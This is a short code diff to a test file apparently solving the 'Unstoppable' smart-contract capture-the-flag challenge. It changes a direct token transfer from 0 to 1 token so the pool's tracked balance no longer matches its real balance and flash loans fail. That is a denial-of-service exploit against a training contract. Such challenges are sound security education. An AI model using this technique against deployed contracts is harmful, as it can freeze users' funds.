@@ -42,7 +42,7 @@ describe('[Challenge] Unstoppable', function () {
         /** CODE YOUR EXPLOIT HERE */
         // send tokens to the contract without calling deposit which makes the balance go up, but not poolBalance storage var
         // flashLoan will fail in assert
-        await this.token.transfer(this.pool.address, 0);
+        await this.token.transfer(this.pool.address, ethers.utils.parseEther('1'));
     });
 
     after(async function () {
